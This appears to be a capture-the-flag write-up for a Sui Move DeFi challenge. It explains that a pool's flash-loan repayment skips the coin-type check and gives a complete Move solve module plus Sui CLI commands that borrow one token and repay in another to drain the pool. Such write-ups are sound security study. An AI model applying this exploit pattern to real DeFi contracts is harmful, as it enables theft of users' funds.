# Week 2

In [week 2](./week2/), we got a contract about pool. Here are the core logics we focus on:

```rust
public fun is_solved(challenge: &Challenge<LP, BUTT, DROP>): bool {
    let pool = &challenge.pool;
    let butt_balance = pool.balance_of<LP, BUTT>();
    let is_flashloan = pool.is_flashloan();

    butt_balance == 0 && is_flashloan == false
}
```

In order to claim flag, we need to satisfy `is_solved` which has 2 conditions: the pool must have `$BUTT` balance of 0 and we are not in flash loan phase.

```rust
public fun create_challenge(mint_butt: MintBUTT<BUTT>, mint_drop: MintDROP<DROP>, create_cap: CreatePoolCap<LP>, ctx: &mut TxContext): Challenge<LP, BUTT, DROP> {
    assert!(mint_butt.get_total_supply() == 0);
    assert!(mint_drop.get_total_supply() == 0);
    
    let coin_1 = butt::mint_for_pool<BUTT>(mint_butt, ctx);
    let mut coin_2 = drop::mint_for_pool<DROP>(mint_drop, ctx);
    
    let pool = pool::new(create_cap, coin_1, coin_2.split(10000000, ctx), 1000, vector[6,6], ctx);

    let challenge = Challenge<LP, BUTT, DROP> {
        id: object::new(ctx),
        pool: pool,
        drop_balance: coin::into_balance(coin_2),
        claimed: false,
        success: false,
    };
    challenge
}

public fun claim_drop(challenge: &mut Challenge<LP, BUTT, DROP>, ctx: &mut TxContext): Coin<DROP> {
    assert!(!challenge.claimed, EAlreadyClaimed);

    challenge.claimed = true;
    let airdrop = challenge.drop_balance.withdraw_all().into_coin(ctx);

    airdrop
}
```

Upon creating the challenge we get some shared objects: `MintBUTT<BUTT>`, `MintDROP<DROP>`, and `CreatePoolCap<LP>`. We can also use `claim_drop` to get 1100 `$DROP` airdrop.

The vulnerability happens in `pool.move`:

```rust
public fun swap_a_to_b<LP, A, B>(
    pool: &mut Pool<LP>,
    coin_a: Coin<A>,
    ctx: &mut TxContext,
): Coin<B> {
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(contains_type<LP, B>(pool), ETypeNotFoundInPool);
    assert!(!pool.flashloan, EFlashloanAlreadyInProgress);

    let amount_out = coin_a.value() * balance_of<LP, B>(pool) / balance_of<LP, A>(pool);
    let fee = amount_out * pool.swap_fee / FEE_PRECISION;
    deposit<LP, A>(pool, coin_a);
    withdraw_internal(pool, amount_out - fee, ctx)
}

public fun flashloan<LP, A>(
    pool: &mut Pool<LP>,
    amount: u64,
    ctx: &mut TxContext,
): (Coin<A>, FlashReceipt) {
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(!pool.flashloan, EFlashloanAlreadyInProgress);

    pool.flashloan = true;

    let coin = withdraw_internal<LP, A>(pool, amount, ctx);
    let receipt = FlashReceipt {
        pool_id: object::id(pool),
        type_name: type_name::get<A>().into_string(),
        repay_amount: amount * (FEE_PRECISION + FLASHLOAN_FEE) / FEE_PRECISION,
    };

    (coin, receipt)
}

public fun repay_flashloan<LP, A>(pool: &mut Pool<LP>, receipt: FlashReceipt, coin: Coin<A>) {
    let FlashReceipt { pool_id: id, type_name: _, repay_amount: amount } = receipt;
    assert!(contains_type<LP, A>(pool), ETypeNotFoundInPool);
    assert!(object::id(pool) == id, EPoolIdMismatch);
    assert!(coin::value(&coin) == amount, ERepayAmountMismatch);
    deposit_internal<LP, A>(pool, coin);

    pool.flashloan = false;
}
```

We have the ability to swap between two coins, do flashloan, and payback flashloan. The critical issue here is in this line: `let FlashReceipt { pool_id: id, type_name: _, repay_amount: amount } = receipt;`. Clearly, `type_name` is not being checked, which means that the coin you loan and the coin you return do not necessarily have to be the same coin. As long as you pass the value check `coin::value(&coin) == amount` the flashloan is considered returned successfully.

This gives us the complete exploit:

1. Get airdrop 1100 of `$DROP`
2. Call `flashloan<BUTT>` of 1000, receipt will have value of 1050 because of 5% service fee
3. Call `repay_flashloan<DROP>` of 1050 (out of the 1100 airdropped) to return the flashloan
4. We now both made `$BUTT` balance to 0 and not in flash loan phase

```rust
module solve_week2::solve{
    use week2::challenge::{Challenge, get_flag, claim_drop, create_challenge};
    use week2::pool::{CreatePoolCap, flashloan, repay_flashloan};
    use week2::lp::LP;
    use week2::butt::{BUTT, MintBUTT};
    use week2::drop::{DROP, MintDROP};
    use std::string::String;
    use sui::transfer::public_share_object;

    #[allow(lint(share_owned))]
    public entry fun create(mint_butt: MintBUTT<BUTT>, mint_drop: MintDROP<DROP>, create_cap: CreatePoolCap<LP>, ctx: &mut TxContext) {
        let challenge = create_challenge(mint_butt, mint_drop, create_cap, ctx);
        public_share_object(challenge);
    }

    public fun solve_get_flag(
        challenge: &mut Challenge<LP, BUTT, DROP>,
        github_id: String,
        ctx: &mut TxContext) {
        // get airdrop 1100 -> split to leave only 1050
        let (coin1, coin2) = {
            let mut balance = claim_drop(challenge, ctx).into_balance();
            let split_balance = balance.split(1050);
            (split_balance.into_coin(ctx), balance.into_coin(ctx))
        };
        transfer::public_transfer(coin2, @0x0);
        // flashloan<BUTT> 1000, receipt 1050
        let (coin, receipt) = flashloan<LP, BUTT>(challenge.get_pool_mut(), 1000, ctx);
        transfer::public_transfer(coin, @0x0);
        // repay_flashloan<DROP> 1050
        repay_flashloan<LP, DROP>(challenge.get_pool_mut(), receipt, coin1);
        get_flag(challenge, github_id, ctx);
    }
}
```

Here are the brief commands used in Sui Client CLI to interact:

```bash
# create challenge
sui client call \
    --package 0xc4aa0ee030c577d59ae34122ce82d36c2e73bd2ccd2a54bf03425396092dbdcc \
    --module solve \
    --function create \
    --args 0x2fc8bb85112f48e1db71f5af426ea39438161db4309a2a7e62be716a7421ef29 0x88327a3840f178df85f37d17fa3e195d7c1a5f3492ae77a30e47385828714b6b 0xeb685aad0a408af4c4ec1a2879b50fe33c429167f5f5ac5576428bcdf8ad69df \
    --gas-budget 100000000

# check balance
sui client object 0x943aafba08ebbe789e993d61482fa0790430954a6a65f7db17e1a0f255303fa3

# deploy contract
sui client call \
    --package 0xc4aa0ee030c577d59ae34122ce82d36c2e73bd2ccd2a54bf03425396092dbdcc \
    --module solve \
    --function solve_get_flag \
    --args 0x943aafba08ebbe789e993d61482fa0790430954a6a65f7db17e1a0f255303fa3 "8f3d7e72-2ef1-4576-8eba-ad0a90d3f3c8" \
    --gas-budget 100000000
```